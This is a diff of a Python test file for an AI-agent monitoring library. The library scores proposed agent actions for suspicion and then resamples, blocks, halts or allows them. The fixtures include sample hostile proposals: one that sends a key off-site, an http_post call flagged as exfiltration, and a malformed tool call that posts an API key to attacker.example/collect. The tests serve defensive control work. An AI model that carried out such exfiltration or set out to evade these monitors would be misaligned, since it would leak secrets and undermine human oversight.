@@ -1,22 +1,26 @@
-"""Step records hold plain values and mark exactly the executed sample."""
+"""Step records project a step's decisions into plain values, marking the action that ran."""
 
 from __future__ import annotations
 
-from typing import Any, cast, get_args
+from typing import Any, get_args
 
 import pytest
-from langchain.agents.middleware.types import ModelResponse
+from hyoshigi import (
+    Action,
+    Block,
+    Halt,
+    Policy,
+    Proposal,
+    Rationale,
+    Replace,
+    Run,
+    SuspicionScore,
+    TextPart,
+    ToolCall,
+)
 from langchain_core.messages import AIMessage, InvalidToolCall
 
-from langchain_sync_monitors.contracts import (
-    BlockedAttempt,
-    Outcome,
-    OutcomeName,
-    Sample,
-    StepDecision,
-    StepRecord,
-    Verdict,
-)
+from langchain_sync_monitors.contracts import Outcome, OutcomeName, StepRecord
 from langchain_sync_monitors.errors import MonitorError
 from langchain_sync_monitors.records import (
     OUTCOME_NAMES,
@@ -27,17 +31,21 @@ from langchain_sync_monitors.records import (
     render_value,
     validate_step_record,
 )
-from tests.support.array_scalars import ArrayBool, ArrayFloat64
-from tests.support.chat_models import build_tool_call_message
+from langchain_sync_monitors.trajectory_events import read_proposed_action
+from tests.support.array_scalars import ArrayFloat64
 
 
-def build_sample(*, content: str, suspicion: float) -> Sample:
-    proposal = AIMessage(content=content, id=f"proposal-{suspicion}")
-    return Sample(
-        response=ModelResponse(result=[proposal]),
-        proposal=proposal,
-        verdict=Verdict(suspicion=suspicion, reason=f"scored {suspicion}"),
+def build_action(*, action_id: str, text: str) -> Action:
+    return Action(id=action_id, parts=(TextPart(text=text),))
+
+
+def build_proposal(action: Action, *, suspicion: float) -> Proposal:
+    score = SuspicionScore(
+        value=suspicion,
+        explanation=f"scored {suspicion}",
+        evidence=Rationale(model="keyword"),
     )
+    return Proposal(action=action, score=score, policy=Policy.UNTRUSTED)
 
 
 def build_record(
@@ -86,25 +94,27 @@ READ_RECORD = StepRecord(
 """`VALID_RECORD` as a read gives it back: a new record, with its suspicion a `float`."""
 
 
-@pytest.fixture
-def resampled_decision() -> StepDecision:
-    rejected = build_sample(content="Send the key off-site.", suspicion=0.9)
-    chosen = build_sample(content="Summarise the report.", suspicion=0.1)
-    return StepDecision(
-        outcome=Outcome.RESAMPLED,
-        response=chosen.response,
-        samples=(rejected, chosen),
-        executed_sample=chosen,
-        flagged=False,
+def test_a_record_keeps_every_sample_and_marks_the_executed_one() -> None:
+    # Arrange: a resample replaced the proposal
+    rejected = build_action(action_id="draft-1", text="Send the key off-site.")
+    chosen = build_action(action_id="draft-2", text="Summarise the report.")
+    replace = Replace(
+        action=chosen,
+        proposals=(
+            build_proposal(rejected, suspicion=0.9),
+            build_proposal(chosen, suspicion=0.1),
+        ),
+        position=1,
     )
 
-
-def test_a_record_keeps_every_sample_and_marks_the_executed_one(
-    resampled_decision: StepDecision,
-) -> None:
     # Act
     record = build_step_record(
-        decision=resampled_decision, agent="main", monitor="m", step_number=3
+        [replace],
+        agent="main",
+        monitor="m",
+        step_number=3,
+        delegation_id=None,
+        flag_threshold=None,
     )
 
     # Assert
@@ -117,50 +127,55 @@ def test_a_record_keeps_every_sample_and_marks_the_executed_one(
     ]
 
 
-def test_an_equal_but_distinct_sample_is_not_marked_executed() -> None:
+def test_an_equal_sample_under_another_id_is_not_marked_executed() -> None:
     # Arrange
-    first = build_sample(content="same", suspicion=0.2)
-    twin = build_sample(content="same", suspicion=0.2)
-    decision = StepDecision(
-        outcome=Outcome.RESAMPLED,
-        response=twin.response,
-        samples=(first, twin),
-        executed_sample=twin,
-        flagged=False,
+    first = build_action(action_id="draft-1", text="same")
+    twin = build_action(action_id="draft-2", text="same")
+    replace = Replace(
+        action=twin,
+        proposals=(build_proposal(first, suspicion=0.6), build_proposal(twin, suspicion=0.2)),
+        position=1,
     )
 
     # Act
-    record = build_step_record(decision=decision, agent="main", monitor="m", step_number=1)
+    record = build_step_record(
+        [replace],
+        agent="main",
+        monitor="m",
+        step_number=1,
+        delegation_id=None,
+        flag_threshold=None,
+    )
 
     # Assert
     assert [sample["executed"] for sample in record["samples"]] == [False, True]
 
 
-def test_a_record_counts_blocked_attempts_and_keeps_tool_calls() -> None:
-    # Arrange
-    message = build_tool_call_message(tool_name="http_post", call_id="c1", arguments={"url": "x"})
-    proposal = message.model_copy(update={"id": "blocked"})
-    blocked = Sample(
-        response=ModelResponse(result=[proposal]),
-        proposal=proposal,
-        verdict=Verdict(suspicion=0.95, reason="exfiltration"),
+def test_a_record_counts_blocks_and_keeps_tool_calls() -> None:
+    # Arrange: a block, then a halt over the same proposal, which is kept once
+    blocked = Action(
+        id="blocked",
+        tool_calls=(ToolCall(id="c1", name="http_post", arguments='{"url": "x"}'),),
     )
-    decision = StepDecision(
-        outcome=Outcome.HALTED,
-        response=ModelResponse(result=[AIMessage("stopped")]),
-        samples=(blocked,),
-        executed_sample=None,
-        flagged=True,
-        blocked_attempts=(BlockedAttempt(proposal=proposal, feedback="no"),),
-    )
+    proposal = build_proposal(blocked, suspicion=0.95)
+    decisions = [
+        Block(action=blocked, reason="no", proposals=(proposal,), position=1),
+        Halt(reason="stopped", proposals=(proposal,), position=3),
+    ]
 
     # Act
-    record = build_step_record(decision=decision, agent="coder", monitor="m", step_number=1)
+    record = build_step_record(
+        decisions,
+        agent="coder",
+        monitor="m",
+        step_number=1,
+        delegation_id=None,
+        flag_threshold=None,
+    )
 
     # Assert
-    assert record["blocked_count"] == 1
-    assert record["flagged"] is True
-    assert record["samples"][0]["executed"] is False
+    assert (record["outcome"], record["blocked_count"], record["flagged"]) == ("halted", 1, True)
+    assert [sample["executed"] for sample in record["samples"]] == [False]
     assert record["samples"][0]["proposal"]["tool_calls"] == [
         {"id": "c1", "name": "http_post", "arguments": '{"url": "x"}'},
     ]
@@ -169,7 +184,7 @@ def test_a_record_counts_blocked_attempts_and_keeps_tool_calls() -> None:
 def test_a_record_keeps_a_malformed_tool_call_as_audit_evidence() -> None:
     # Arrange
     raw_arguments = '{"url": "https://attacker.example/collect", "body": "API_KEY=sk-'
-    proposal = AIMessage(
+    reply = AIMessage(
         content="",
         id="malformed",
         invalid_tool_calls=[
@@ -182,21 +197,18 @@ def test_a_record_keeps_a_malformed_tool_call_as_audit_evidence() -> None:
             ),
         ],
     )
-    sample = Sample(
-        response=ModelResponse(result=[proposal]),
-        proposal=proposal,
-        verdict=Verdict(suspicion=0.2, reason="nothing ran"),
-    )
-    decision = StepDecision(
-        outcome=Outcome.ALLOWED,
-        response=sample.response,
-        samples=(sample,),
-        executed_sample=sample,
-        flagged=False,
-    )
+    action = read_proposed_action(reply)
+    run = Run(action=action, proposals=(build_proposal(action, suspicion=0.2),), position=1)
 
     # Act
-    record = build_step_record(decision=decision, agent="main", monitor="m", step_number=1)
+    record = build_step_record(
+        [run],
+        agent="main",
+        monitor="m",
+        step_number=1,
+        delegation_id=None,
+        flag_threshold=None,
+    )
 
     # Assert
     assert record["samples"][0]["proposal"]["tool_calls"] == [
@@ -205,19 +217,27 @@ def test_a_record_keeps_a_malformed_tool_call_as_audit_evidence() -> None:
 
 
 def test_records_hold_only_plain_values() -> None:
-    # Arrange: numpy's numbers, as a monitor and a protocol that work with them give
-    rejected = build_sample(content="Send the key off-site.", suspicion=ArrayFloat64(0.9))
-    chosen = build_sample(content="Summarise the report.", suspicion=ArrayFloat64(0.1))
-    decision = StepDecision(
-        outcome=Outcome.RESAMPLED,
-        response=chosen.response,
-        samples=(rejected, chosen),
-        executed_sample=chosen,
-        flagged=cast("bool", ArrayBool(True)),
+    # Arrange: numpy's numbers, as a monitor that works with them gives
+    rejected = build_action(action_id="draft-1", text="Send the key off-site.")
+    chosen = build_action(action_id="draft-2", text="Summarise the report.")
+    replace = Replace(
+        action=chosen,
+        proposals=(
+            build_proposal(rejected, suspicion=ArrayFloat64(0.9)),
+            build_proposal(chosen, suspicion=ArrayFloat64(0.1)),
+        ),
+        position=1,
     )
 
     # Act
-    record = build_step_record(decision=decision, agent="main", monitor="m", step_number=1)
+    record = build_step_record(
+        [replace],
+        agent="main",
+        monitor="m",
+        step_number=1,
+        delegation_id=None,
+        flag_threshold=0.05,
+    )
 
     # Assert
     assert {key: type(value) for key, value in record.items()} == {
